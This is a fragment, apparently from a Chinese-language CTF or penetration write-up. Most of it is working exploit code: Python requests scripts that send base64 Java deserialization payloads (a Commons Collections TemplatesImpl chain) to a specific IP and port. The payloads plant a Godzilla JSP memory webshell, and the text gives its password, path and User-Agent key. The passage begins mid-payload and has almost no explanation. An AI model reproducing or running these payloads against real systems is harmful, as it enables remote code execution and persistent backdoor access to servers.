ocmVhZDsBAA5nZXRDbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL3V0aWwvQXJyYXlzAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwEAGShMamF2YS91dGlsL0NvbGxlY3Rpb247KVYBAAd0b0FycmF5AQAVKClbTGphdmEvbGFuZy9PYmplY3Q7AQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2Zvck5hbWUBAAlnZXRNZXRob2QBAAUoW0IpVgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEABHJlYWQBAAUoW0IpSQEABXdyaXRlAQAHKFtCSUkpVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmVxdWFscwEAEWdldFBhcmFtZXRlclR5cGVzAQAUKClbTGphdmEvbGFuZy9DbGFzczsBAApnZXRNZXNzYWdlACEAagBrAAAAAAAQAAEAbABtAAEAbgAAAC0AAQABAAAAAxIBsAAAAAI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"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
```

```python
密码: Bfzwcmbggsdytqtff
地址: /*
请求头: User-Agent: Rechjn
脚本类型: JSP
```

写哥斯拉马脚本

```python
import requests

burp0_url = "http://119.45.178.147:30000/"
burp0_cookies = {"JSESSIONID": "91540884E76F00EB1BF1A5AAD6B0B504"}
burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "Origin": "http://119.45.178.147:30000", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://119.45.178.147:30000/shellAacw125", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
burp0_data = {"data": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAKTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAL8HK/rq+AAAANAFdCADRCADSCADTCgBXANQKAFYA1QoAVgDWCgBWANcKANgA2QoA2ADaCADbCgAmANwIAN0KAFYA3ggA3wgA4AgA4QgA4ggA4wcA5AgA5QcA5goAVgDnBwDoCADpCgATAOoIAHsKAFYA6wcA7AoAHADtCwDuAO8IAPAKABUA8QoAEwDyCgBWAPMKAFYA9AoAVgD1CgBWAPYHAPcIAIkHAIgJAPgA+QoAEwD6CgD7APwKAPgA/QoA+wD+BwD/CAEABwEBCAECCACTBwEDCgAzAQQIAQUKABMBBggBBwoAEwEICAEJCAEKCAELBwEMCgA8ANQHAQ0KAD4BDgcBDwoAQAEQCgBAAREKADwBEgoAPAETCgBWARQKARUA/AoBFQEWCgATARcHARgKABMBGQoASQEaCgATARsKAPsBHAoAMAEdCgD7AR4HAR8KAFABGgcBIAcBIQoAUgEiCgBTARoHASMHASQBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExjb20vZXhhbXBsZS9leHAvQXZ4ZXJiOwEADGdldENsYXNzTmFtZQEAD2dldEJhc2U2NFN0cmluZwEACkV4Y2VwdGlvbnMHASUBAAY8aW5pdD4BAAMoKVYBAAdjb250ZXh0AQASTGphdmEvbGFuZy9PYmplY3Q7AQALaW50ZXJjZXB0b3IBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwEmAQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKZ2V0Q29udGV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARcmVxdWVzdEF0dHJpYnV0ZXMBAAdzZXNzaW9uAQAOc2VydmxldENvbnRleHQBABJhcHBsaWNhdGlvbkNvbnRleHQBABNhcHBsaWNhdGlvbkNvbnRleHRzAQAZTGphdmEvdXRpbC9MaW5rZWRIYXNoU2V0OwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAA1TdGFja01hcFRhYmxlBwEjBwD3BwDmBwDoBwEnBwEoAQAOZ2V0SW50ZXJjZXB0b3IBAAljbGF6ekJ5dGUBAAJbQgEAC2RlZmluZUNsYXNzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAVjbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyOAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwcA/wEADmFkZEludGVyY2VwdG9yAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAE2FkYXB0ZWRJbnRlcmNlcHRvcnMBABVMamF2YS91dGlsL0FycmF5TGlzdDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQApTGphdmEvdXRpbC9BcnJheUxpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEABHZhcjQBAAliYXNlNjRTdHIBABJMamF2YS9sYW5nL1N0cmluZzsBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAAFJBwEMBwENBwEPAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47BwDkBwEYAQAMaW52b2tlTWV0aG9kAQAMdGFyZ2V0T2JqZWN0AQAKbWV0aG9kTmFtZQEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAAWkBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFdmFyMTEBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAAR2YXI5AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEABXZhcjEwAQAKcGFyYW1DbGF6egEAEltMamF2YS9sYW5nL0NsYXNzOwEABXBhcmFtAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEABm1ldGhvZAEACXRlbXBDbGFzcwcBKQcAvwcBHwcBIAEAClNvdXJjZUZpbGUBAAtBdnhlcmIuamF2YQEADS9zaGVsbEFhY3cxMjUBAAZBcXdyZ2YBD2xINHNJQUFBQUFBQUFBSTFYQ1h3VTFSMyszaDZaWmJNY0psd1J1UVdTYkpKRkNDQUp0Q1FCSlpLRUl3Z0VySGF5TzBrV05ydkw3R3hDcEJRdlZDbzk3RzN0YlZ2YVlsdUV1a21rS3EydHR2YTBsN1dIUFd4cmF5Mjk3R0dycHQ5N005bHNMZ0R5bTNuNzN2LzgvdGViSjE5NzZCRUFWNGlsQW5rMSs3dk45allOUW1EYVhyMUxEOFgwZUh1b0xxYW5VZzBKUFdLWUd0d0NxeEptZXlpVk5LUHg5alpUN3pTNkUrYStVTGZSR2tvWlpsZk1zRUkxcVo1NGVLTWVqOFFNc3o1dUdXYllTRm9KTW5zRkpyWWIxa1pEeW1vaXE4RFU0cEtHSVZYTmxwUmFMZUNwUzBSNDZxMXBOK0tXRDM2QlNWbkdIWG9zelRPM3J1cytUQlNZSEkxSHJicDB5a3AwYnRGcEVJK0tTM1lJK0RhR1RTTzJWOS9ud3lXVW1LUVhBZ1dqdFFWUWlLa1Q0TUkwZ1NsNlcvaEt2WFg1S24zMTBxV1JwWkhWUHN3UWNCMElCMUJrRTExS25OWklqYStqNW9abzNHaEtkN1lhNW5hOU5XWkk4WW13SHR1aG0xSDUyOW4wV0IxUnF2WTEyUGhTNFdXWTRvY0g4d1V1TFc0WUUrbHE2WUc0VVdER09PZFN5RUlwWkRGcFJ2cFVtNDdHVkxpSy9TaVJhdkwwWk5LSVJ3VEtpMGNETURvQ0RqK1ZCRkVtUlpUVGZDdGhId1lRZ2s5dU1tWGNuWkVWQW9zdlNpaWxMY055UHpHc2xDdUY1a282dVpYWlZyeW50bVNrbzB3RFY3aVZqejIxQXZrUm80MWdxd002VFByNit0RWNBYXpCV2drS2d5TU9DR2lrMjEwaStRdUhTRGNja1BrWVRjUTE4RUNFcVY0Sk9oQUttejFNMUZCZE5ObEI1eG00THQyc0hEd2V3Y3hqUVVzRTAwM3MxbER0cUJnaFJFTURjNzdaMHNQN0d2V2trdy91bWczTlBteW1VOHpwK25qSzB1TmhicGVNaStKSXl3TFlpbTErTktKWllPNHdnbFRTQ0llYURTYSt0Y25vYWVZdkRkY3lyVWNLMXJDVEVhWDYyaDdMb0J1ZVlxSVVRQXQyKzdFTGUyeUV4ekJuaDB5N04vaXhBOWVUU1phQkpLMjNLVk5HT0cxR3JaNFFWU3ZTTjBLWFZqS0dXaVJ4VlRTdXg1aUpNdFJTVndTR1BHd1RtSkEwRGJ0ZENFU0tIWThIbTBtSFpTVkRHL2xvdGplMkdmdlRSc3FxdmlCWktwbUlwNHpxSENjMnQrNDF3bFoxeVc2QmVVTzdkZ0NzcUM2am1wTWJlNGRUeFdKR3V4NnJDWWVOVkNxSGloNkp0dUZ0eFZIREEvcVRHOU50Umx1TUo5RXVZM1BTTUlmcnE1WTFhcHFiMHdSMHJzMFRUWVJrZEdwTVUrL2hmakp0TVFxRzNrbFNMVVVyeUVVVHg4ZEJVY2dzanVpV1RoN1RSazVneVVWQ3pBd3hIUmdISGJrSXdLbXB3Kzc5QW5QT2I1eUdOd2tzdWloak5MeVpmZWJpVE5CdzA3Q1V0d09pNFJhQjJlZEZWc050anBJTEIwekQ3UUZvc2hHNmNDZHpPRHVlQW5nTGx1ZmpNTzRLSUdDZnY1VkloaE54UzQvR1dXdXpoclg4RHQxc2xpNnlCVEF6QTNnNzNpRkw4RzRCUDBVMkQ4WjVRWEhKaFNJZHdMdndicW40UFFJQjhxcGhhRmpTb3ZmWkZyMmZkcmF1ckZ4dmhOVjBuVDVXdzVHbCtRSGNLODMrWUFEclVDTlhIMlpRazNwUGpLUEhoNC9hNG1zc2NyU21MZVBDL2QrcGlBQStqdnZ5Y1FpZnNIdVAwOHdMaThkcTVKL0NjVDl1eGFjNVpVY2NhdmlzZlIzSUdZY0NSYU9sWkNmbC9maWNIeWZ3ZWVuSzRnQ3V4R3E1ZW9CK3BJYjVzV1FNUDhib0greHNwL0ZGNmNpRGpGSnlFT2FVRDcwUzVRZjlPQ0puYm43YzZCN3E3c012T2xsRXp1QkwwclNIZVJQSXliczArMUdua1pOcmp3ck16RFZ1ZTRlWjZKYlR4R25KWC9iakxMN0NIc0pVMG1NcE9WSEhhbndCZkJWZms3QStibWZzVHJackNkNk1RZU5ZR1Z2b3RuTkErNzZPYitUalpqeEorbFM2TmFVd2taa3pmUHBtQi95MzhHMlp2ZDhaSExqRDVXbjRIdTkwM1hJOXdzS2MrZko5L01DUHAvQkRhU1p2R1BsV0lsdXJBVHd0QjlRUi9JU2hhOVZUeHNyS0RmSEJYQjUrZzhoYTlGUDhUQWI3NTFMaGVEWS9LMjMrSldPWlJad0l6aDR4MUJwWlpucTdzVDdhYnZkR04yY3NuNDNyVi9qd1cxYjFlYWcxL0Y3Z2l2R0xaQndkY3N6L3dZL244VWNHTm1iRTI2ME9kYmV0RCtCUGVGSGEvR2NlcEpQczc0WjkxMkZVaU9CZjhGZko5VGNtblJMZnFWc2RvZHBvdTd5THQ4c28vSU5zRWFVamdIOUtSSi9IditSa3JpZUdLcDMrNDhkTGVGbGU5SjZWcS8rcE1GekxLNlJaUjlRRGVGWDJ0VjE0alZydEFEQ0g4dXlBQ0Z3eXhrVk8zcVI0MTNPMUVsaHZsMzJCVngyNkltMUZZeFcxaXRVbjhpaXdMZUY4R2l5NlFGZHhPb1h3aVFrc0llRzNPNlpqajA4RU9KWDNqQ0xYeENRNzlSc05xeVBCQy9HNk1iU01ac3ZWYTlwVElXUkxvQUZUeENYU2dBSW0vWjdSVmFlSnFTemU4ZGcxTVozUVJlTmRpWDEwZWZVWVZUdUd5TEU2aVpncGl2eGlodUQzeVNSRFliRGR1YS83eEdXc2oxUTZYdEVaVFlVcmFtdWFOd3pXRFdHYUk1dUcrdUVUOCtSRnpYRGlLY0cwSndXcEZzcU1NV3lxUmFPbFplbVdzREJ0dXRwMFc1dmNLV0d2WHhPT3FTK21BQ2JMRHgrWEtLUDQ1a1NhSDRaWFJlV3RiK2JWaWNpTjBWaE16L2xjckpBK1lqNXIxd05xaHh0KytRM0dqMVcvL0dCVDcyWHFIZUNLazVoVUUvaHJDdC95bjZjUStTZlZ5aS9uOE9qVFNZT25rOVd1UEMxeVRpY1dvdUEwcGhkaTVtbk1la0J0Q2ZuUjVwQ0YrSmFFM3RKZUxKREhMc3ptTTA5dGxtS09za2tSWUM3bU9jd0xIZWJyU2UzaWUwRnBzQmRMenFDa3BSZWxwekE5ZzRwVG1NVm5CbGYwWWNWcHJCcVNQSW5lQStXVVYwRkVRa3JEZEZ1S28wR3VMc2NpWlJqbm02TnJMYkdUVkJOS2crN2dJNzE0L2NrUnhpN1BFVFVoSzJvQ3FsQ3RSSEgrTzZLZUpvZUg3MkRCbGo1c2J5cS83QjVvbnVQd2VNOWdSNHN5L0xxQ0xiMjRJWU53ZVRDRDlwTk40cVJTc1FURnFLUDlzNVVpTDU5WFV0UnEybHZGazJwK1I2NVJSbFR5TEkrNzY3R0IxQ1UwNlNwY3Jmd09aZzBMWXFNeVRLN3FjUTFwbXJoZUEvY0FnK2pSNE5Ld1NXajhxcENQQVJubW5EMHVHc1VBWnNEdGJFcXFPa3JyUUpTUzZLVExUeHVrcytlQ2ZUam